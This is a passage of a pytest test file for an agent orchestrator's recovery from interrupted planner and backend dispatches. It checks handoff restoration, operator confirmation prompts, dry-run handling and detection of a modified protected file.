    # first dispatch after the pause snapshotted the protected file the
    # interrupted role had already changed.
    _init_repo(tmp_path)
    head = _git(tmp_path, "rev-parse", "HEAD")
    orchestrator = _orchestrator()
    _write(tmp_path / "tests" / "test_app.py", "# operator draft\n")

    def interrupted_backend(path: Path, **_kwargs: object) -> DispatchResult:
        _write(tmp_path / "src" / "app.py", "VALUE = 2\n")
        _write(tmp_path / "AGENTS.md", "rewritten by the backend\n")
        path.write_text(HALF_WRITTEN_HANDOFF, encoding="utf-8")
        raise KeyboardInterrupt

    with monkeypatch.context() as patch:
        patch.setattr(orchestrator, "invoke_backend_role", interrupted_backend)
        _set_terminal(orchestrator, patch, interactive=False, operator_input=None)
        with pytest.raises(KeyboardInterrupt):
            orchestrator.run_loop(_config(tmp_path), max_cycles=1, log=lambda *_: None)
    assert _record_path(tmp_path).exists()
    _write(tmp_path / "tests" / "test_app.py", "# operator draft, revised\n")
    calls: list[int] = []

    def finishing_backend(path: Path, **_kwargs: object) -> DispatchResult:
        # Leaves AGENTS.md alone.
        calls.append(1)
        path.write_text(_pending_claim(), encoding="utf-8")
        return _result()

    monkeypatch.setattr(orchestrator, "invoke_backend_role", finishing_backend)
    pauses: list[str] = []

    def operator_retries_once(_config: object, **kwargs: Any) -> Any:
        # The operator answers the operator-file pause with `retry` and
        # stops at any later pause.
        pauses.append(kwargs["reason"])
        return orchestrator.PauseOutcome(kind="retry" if len(pauses) == 1 else "stop")

    monkeypatch.setattr(orchestrator, "_pause_at_dispatcher_pause", operator_retries_once)
    _set_terminal(orchestrator, monkeypatch, interactive=True, operator_input="y\n")
    messages: list[tuple[str, str]] = []

    orchestrator.run_loop(_config(tmp_path), max_cycles=1, log=_collecting_log(messages))

    assert "AGENTS.md" in _disclosure_before(messages, _recover_question())
    assert pauses[0].startswith("INTERRUPTED DISPATCH:")
    assert calls == [1]
    assert any(
        level == "ERROR"
        and message.startswith(orchestrator.PROTECTED_FILE_MODIFIED_PREFIX)
        and "AGENTS.md" in message
        for level, message in messages
    )
    assert _git(tmp_path, "rev-parse", "HEAD") == head
    handoff = (tmp_path / HANDOFF_RELATIVE_PATH).read_text(encoding="utf-8")
    assert "next_agent: user" in handoff


# ---------------------------------------------------------------------------
# RECOVERY-3b1: interrupted planner dispatch
# ---------------------------------------------------------------------------


PLANNER_QUESTION = (
    "Restore the handoff from before planner's interrupted dispatch and run "
    "planner again? [y/N]"
)


def _planner_payload(**changes: Any) -> dict[str, Any]:
    record = InFlightRecord(
        cycle=2,
        role="planner",
        story_key=None,
        phase="dispatch",
        head_sha="a" * 40,
        handoff_content=_planner_assignment(),
        dirty_fingerprints=(),
        carried_over=(),
    )
    payload = json.loads(in_flight_record_payload(record))
    payload.update(changes)
    return payload


def _interrupt_planner(
    repo_root: Path,
    orchestrator: Any,
    monkeypatch: pytest.MonkeyPatch,
    *,
    leave: str | None = HALF_WRITTEN_HANDOFF,
    keep: bool = False,
) -> None:
    """Run one planner dispatch that is interrupted mid-dispatch.

    The planner writes ``leave`` to the handoff (deletes it when None, leaves
    it alone with ``keep``) and is then interrupted; the record stays on disk.
    """

    def interrupted_planner(path: Path, **_kwargs: object) -> DispatchResult:
        if not keep:
            if leave is None:
                path.unlink()
            else:
                path.write_text(leave, encoding="utf-8")
        raise KeyboardInterrupt

    with monkeypatch.context() as patch:
        patch.setattr(orchestrator, "invoke_planner_role", interrupted_planner)
        _set_terminal(orchestrator, patch, interactive=False, operator_input=None)
        with pytest.raises(KeyboardInterrupt):
            orchestrator.run_loop(_config(repo_root), max_cycles=1, log=lambda *_: None)
    assert _record_path(repo_root).exists()


def test_load_in_flight_record_accepts_a_planner_record_without_a_story() -> None:
    record = load_in_flight_record(json.dumps(_planner_payload()))

    assert record is not None
    assert record.role == "planner"
    assert record.story_key is None


def test_load_in_flight_record_accepts_a_planner_record_with_a_matching_key() -> None:
    payload = _planner_payload(
        handoff_content=_assignment(), story_key=f"story:{STORY_ID}"
    )

    record = load_in_flight_record(json.dumps(payload))

    assert record is not None
    assert record.story_key == f"story:{STORY_ID}"


@pytest.mark.parametrize(
    "changes",
    [
        pytest.param(
            {"phase": "handback", "handback_content": _assignment()},
            id="planner_handback",
        ),
        pytest.param(
            {"dirty_fingerprints": [["notes.txt", "f" * 64]]},
            id="planner_dirty_fingerprints",
        ),
        pytest.param({"carried_over": ["src/app.py"]}, id="planner_carried_over"),
        pytest.param(
            {"assignment_content": _planner_assignment()},
            id="planner_assignment_content",
        ),
        pytest.param(
            {"handoff_content": _assignment()}, id="planner_null_key_with_a_story"
        ),
        pytest.param({"story_key": ""}, id="planner_empty_key"),
    ],
)
def test_load_in_flight_record_rejects_a_bad_planner_record(
    changes: dict[str, Any],
) -> None:
    assert load_in_flight_record(json.dumps(_planner_payload(**changes))) is None


def test_load_in_flight_record_rejects_a_null_story_key_for_an_implementer() -> None:
    payload = _valid_payload()
    payload["story_key"] = None
    payload["handoff_content"] = _planner_assignment()

    assert load_in_flight_record(json.dumps(payload)) is None


def test_an_interrupted_planner_leaves_the_record(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    _init_repo(tmp_path, handoff=_planner_assignment())
    head = _git(tmp_path, "rev-parse", "HEAD")
    orchestrator = _orchestrator()

    _interrupt_planner(tmp_path, orchestrator, monkeypatch)

    record = load_in_flight_record(_record_path(tmp_path).read_text(encoding="utf-8"))
    assert record is not None
    assert record.role == "planner"
    assert record.head_sha == head
    assert record.handoff_content == _planner_assignment()
    assert record.protected_digests is not None


def test_dry_run_writes_no_planner_record(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    _init_repo(tmp_path, handoff=_planner_assignment())
    orchestrator = _orchestrator()

    def refusing_planner(path: Path, **_kwargs: object) -> DispatchResult:
        raise AssertionError("dry run must not dispatch")

    monkeypatch.setattr(orchestrator, "invoke_planner_role", refusing_planner)

    orchestrator.run_loop(
        _config(tmp_path, dry_run=True), max_cycles=1, log=lambda *_: None
    )

    assert not _record_path(tmp_path).exists()


def test_a_planner_record_that_cannot_be_cleared_stops_the_run(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    _init_repo(tmp_path, handoff=_planner_assignment())
    orchestrator = _orchestrator()

    def fake_planner(path: Path, **_kwargs: object) -> DispatchResult:
        path.write_text(_assignment(), encoding="utf-8")
        return _result()

    monkeypatch.setattr(orchestrator, "invoke_planner_role", fake_planner)
    monkeypatch.setattr(
        orchestrator, "_delete_in_flight_record", lambda _config, _log: False
    )
    messages: list[tuple[str, str]] = []

    exit_code = orchestrator.run_loop(
        _config(tmp_path), max_cycles=1, log=_collecting_log(messages)
    )

    assert exit_code == 1
    errors = [message for level, message in messages if level == "ERROR"]
    assert len(errors) == 1
    assert "after the planner dispatch returned" in errors[0]
    assert _record_path(tmp_path).exists()


def test_an_unchanged_handoff_deletes_the_planner_record(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    _init_repo(tmp_path, handoff=_planner_assignment())
    orchestrator = _orchestrator()
    _interrupt_planner(tmp_path, orchestrator, monkeypatch, keep=True)
    _set_terminal(orchestrator, monkeypatch, interactive=True, operator_input=None)
    messages: list[tuple[str, str]] = []

    outcome = orchestrator._recover_interrupted_dispatch(
        _config(tmp_path), _collecting_log(messages), orchestrator._OperatorPromptState()
    )

    assert outcome == orchestrator.InterruptedDispatchRecovery()
    assert [level for level, _message in messages] == ["INFO"]
    assert "interrupted planner dispatch that left nothing to recover" in messages[0][1]
    assert not _record_path(tmp_path).exists()
    handoff = tmp_path / HANDOFF_RELATIVE_PATH
    assert handoff.read_text(encoding="utf-8") == _planner_assignment()


def test_a_valid_changed_handoff_is_kept_and_the_planner_record_deleted(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    _init_repo(tmp_path, handoff=_planner_assignment())
    orchestrator = _orchestrator()
    _interrupt_planner(tmp_path, orchestrator, monkeypatch, leave=_assignment())
    _set_terminal(orchestrator, monkeypatch, interactive=True, operator_input=None)
    messages: list[tuple[str, str]] = []

    outcome = orchestrator._recover_interrupted_dispatch(
        _config(tmp_path), _collecting_log(messages), orchestrator._OperatorPromptState()
    )

    assert outcome == orchestrator.InterruptedDispatchRecovery()
    assert [level for level, _message in messages] == ["INFO"]
    assert "finished writing a valid handoff" in messages[0][1]
    assert not _record_path(tmp_path).exists()
    handoff = tmp_path / HANDOFF_RELATIVE_PATH
    assert handoff.read_text(encoding="utf-8") == _assignment()


@pytest.mark.parametrize(
    "leave",
    [
        pytest.param(HALF_WRITTEN_HANDOFF, id="half_written"),
        pytest.param("", id="empty"),
        pytest.param(None, id="missing"),
    ],
)
def test_a_confirmed_planner_recovery_restores_the_handoff_and_runs_the_planner(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
    leave: str | None,
) -> None:
    _init_repo(tmp_path, handoff=_planner_assignment())
    orchestrator = _orchestrator()
    _interrupt_planner(tmp_path, orchestrator, monkeypatch, leave=leave)
    calls: list[dict[str, Any]] = []

    def finishing_planner(path: Path, **kwargs: object) -> DispatchResult:
        calls.append({"handoff": path.read_text(encoding="utf-8"), **kwargs})
        path.write_text(_assignment(), encoding="utf-8")
        return _result()

    monkeypatch.setattr(orchestrator, "invoke_planner_role", finishing_planner)
    _set_terminal(orchestrator, monkeypatch, interactive=True, operator_input="y\n")
    messages: list[tuple[str, str]] = []

    orchestrator.run_loop(_config(tmp_path), max_cycles=1, log=_collecting_log(messages))

    prompt_index = messages.index(("INFO", PLANNER_QUESTION))
    _disclosure_before(messages, PLANNER_QUESTION)
    assignment_level, assignment_line = messages[prompt_index - 2]
    assert assignment_level == "INFO"
    assert "cannot verify" in assignment_line
    assert "no ## Work Packet section" in assignment_line
    summary_level, summary_line = messages[prompt_index - 3]
    assert summary_level == "INFO"
    assert summary_line.startswith(f"Found in-flight record {_record_path(tmp_path)}")
    assert "planner" in summary_line
    assert "will be replaced" in summary_line
    if leave is None:
        assert "(handoff_missing)" in summary_line
    elif leave == "":
        assert "(handoff_empty)" in summary_line
    assert any(
        level == "INFO" and message.startswith("Restored the half-written handoff")
        for level, message in messages
    )
    assert ("INFO", "Routing source: interrupted_planner_recovery") in messages
    assert len(calls) == 1
    assert calls[0]["handoff"] == _planner_assignment()
    instruction = str(calls[0]["additional_instruction"])
    assert orchestrator.INTERRUPTED_PLANNER_INSTRUCTION in instruction
    assert not _record_path(tmp_path).exists()
    handoff = tmp_path / HANDOFF_RELATIVE_PATH
    assert handoff.read_text(encoding="utf-8") == _assignment()


def test_the_planner_recovery_schedules_the_planner_with_its_baseline(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    _init_repo(tmp_path, handoff=_planner_assignment())
    orchestrator = _orchestrator()
    _interrupt_planner(tmp_path, orchestrator, monkeypatch)
    _set_terminal(orchestrator, monkeypatch, interactive=True, operator_input="y\n")
    messages: list[tuple[str, str]] = []

    outcome = orchestrator._recover_interrupted_dispatch(
        _config(tmp_path), _collecting_log(messages), orchestrator._OperatorPromptState()
    )

    assert outcome.recovered is False
    assert outcome.leftovers is None
    pending = outcome.pending
    assert pending is not None
    assert pending.kind == "interrupted_planner"
    assert pending.route == "planner"
    assert pending.handoff_sha == orchestrator._content_sha(_planner_assignment())
    assert pending.additional_instruction == orchestrator.INTERRUPTED_PLANNER_INSTRUCTION
    assert "interrupted before it finished rewriting" in pending.additional_instruction
    assert "restored the handoff" in pending.additional_instruction
    assert pending.resumed_protected_snapshot is not None
    assert not _record_path(tmp_path).exists()


@pytest.mark.parametrize(
    ("interactive", "operator_input", "interactive_pause"),
    [
        pytest.param(False, None, True, id="no_tty"),
        pytest.param(True, "n\n", True, id="tty_declines"),
        pytest.param(True, "", True, id="tty_eof"),
        pytest.param(True, None, False, id="interactive_pause_off"),
    ],
)
def test_an_unconfirmed_planner_recovery_keeps_the_invalid_handoff(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
    interactive: bool,
    operator_input: str | None,
    interactive_pause: bool,
) -> None:
    _init_repo(tmp_path, handoff=_planner_assignment())
    orchestrator = _orchestrator()
    _interrupt_planner(tmp_path, orchestrator, monkeypatch)
    _set_terminal(
        orchestrator,
        monkeypatch,
        interactive=interactive,
        operator_input=operator_input,
    )
    messages: list[tuple[str, str]] = []

    outcome = orchestrator._recover_interrupted_dispatch(
        _config(tmp_path, interactive_pause=interactive_pause),
        _collecting_log(messages),
        orchestrator._OperatorPromptState(),
    )

    assert outcome == orchestrator.InterruptedDispatchRecovery()
    asked = ("INFO", PLANNER_QUESTION) in messages
    assert asked == (interactive and interactive_pause)
    warnings = [message for level, message in messages if level == "WARN"]
    assert len(warnings) == 1
    assert warnings[0].startswith("Discarded the in-flight record")
    assert "planner" in warnings[0]
    assert "not confirmed at a terminal" in warnings[0]
    assert not _record_path(tmp_path).exists()
    handoff = tmp_path / HANDOFF_RELATIVE_PATH
    assert handoff.read_text(encoding="utf-8") == HALF_WRITTEN_HANDOFF


def test_dry_run_keeps_the_planner_record_and_the_handoff(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    _init_repo(tmp_path, handoff=_planner_assignment())
    orchestrator = _orchestrator()
    _interrupt_planner(tmp_path, orchestrator, monkeypatch)
    original = _record_path(tmp_path).read_text(encoding="utf-8")

    def refusing_planner(path: Path, **_kwargs: object) -> DispatchResult:
        raise AssertionError("dry run must not dispatch")

    monkeypatch.setattr(orchestrator, "invoke_planner_role", refusing_planner)
    # The half-written handoff does not route; its validator is not under test.
    monkeypatch.setattr(
        orchestrator, "_run_unknown_route_validator", lambda _config, _log: None
    )
    _set_terminal(orchestrator, monkeypatch, interactive=True, operator_input=None)
    messages: list[tuple[str, str]] = []

    orchestrator.run_loop(
        _config(tmp_path, dry_run=True), max_cycles=1, log=_collecting_log(messages)
    )

    assert _record_path(tmp_path).read_text(encoding="utf-8") == original
    found = [
        message
        for level, message in messages
        if level == "INFO" and message.startswith("Found in-flight record")
    ]
    assert len(found) == 1
    assert "planner" in found[0]
    assert found[0].endswith("Not applied in dry run.")
    assert ("INFO", PLANNER_QUESTION) not in messages
    handoff = tmp_path / HANDOFF_RELATIVE_PATH
    assert handoff.read_text(encoding="utf-8") == HALF_WRITTEN_HANDOFF


@pytest.mark.parametrize("dry_run", [False, True])
def test_an_unanchored_planner_record_is_discarded(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
    dry_run: bool,
) -> None:
    _init_repo(tmp_path, handoff=_planner_assignment())
    orchestrator = _orchestrator()
    _interrupt_planner(tmp_path, orchestrator, monkeypatch)
    _rewrite_record(tmp_path, head_sha="b" * 40)
    original = _record_path(tmp_path).read_text(encoding="utf-8")
    _set_terminal(orchestrator, monkeypatch, interactive=True, operator_input=None)
    messages: list[tuple[str, str]] = []

    outcome = orchestrator._recover_interrupted_dispatch(
        _config(tmp_path, dry_run=dry_run),
        _collecting_log(messages),
        orchestrator._OperatorPromptState(),
    )

    assert outcome == orchestrator.InterruptedDispatchRecovery()
    assert [level for level, _message in messages] == ["WARN"]
    warning = messages[0][1]
    assert warning.startswith("Discarded the in-flight record")
    assert "planner's interrupted" in warning
    assert "does not resolve to a commit" in warning
    if dry_run:
        assert warning.endswith("Not deleted in dry run.")
        assert _record_path(tmp_path).read_text(encoding="utf-8") == original
    else:
        assert not _record_path(tmp_path).exists()
    handoff = tmp_path / HANDOFF_RELATIVE_PATH
    assert handoff.read_text(encoding="utf-8") == HALF_WRITTEN_HANDOFF


def test_a_planner_record_without_a_protected_snapshot_is_discarded(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    _init_repo(tmp_path, handoff=_planner_assignment())
    orchestrator = _orchestrator()
    _interrupt_planner(tmp_path, orchestrator, monkeypatch)
    _rewrite_record(tmp_path, protected_digests=None)
    _set_terminal(orchestrator, monkeypatch, interactive=True, operator_input=None)
    messages: list[tuple[str, str]] = []

    outcome = orchestrator._recover_interrupted_dispatch(
        _config(tmp_path), _collecting_log(messages), orchestrator._OperatorPromptState()
    )

    assert outcome == orchestrator.InterruptedDispatchRecovery()
    assert [level for level, _message in messages] == ["WARN"]
    assert "no pre-dispatch protected-file snapshot" in messages[0][1]
    assert not _record_path(tmp_path).exists()
    handoff = tmp_path / HANDOFF_RELATIVE_PATH
    assert handoff.read_text(encoding="utf-8") == HALF_WRITTEN_HANDOFF


def test_a_backend_record_still_recovers_after_planner_records(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    _init_repo(tmp_path)
    orchestrator = _orchestrator()
    _interrupt_backend(tmp_path, orchestrator, monkeypatch)
    _set_terminal(orchestrator, monkeypatch, interactive=True, operator_input="y\n")
    messages: list[tuple[str, str]] = []

    outcome = orchestrator._recover_interrupted_dispatch(
        _config(tmp_path), _collecting_log(messages), orchestrator._OperatorPromptState()
    )

    assert outcome.recovered is True
    assert outcome.pending is not None
    assert outcome.pending.kind == "interrupted_dispatch"
    assert outcome.pending.route == "backend"
    assert ("INFO", _recover_question()) in messages
    assert ("INFO", PLANNER_QUESTION) not in messages
    assert (tmp_path / HANDOFF_RELATIVE_PATH).read_text(encoding="utf-8") == _assignment()
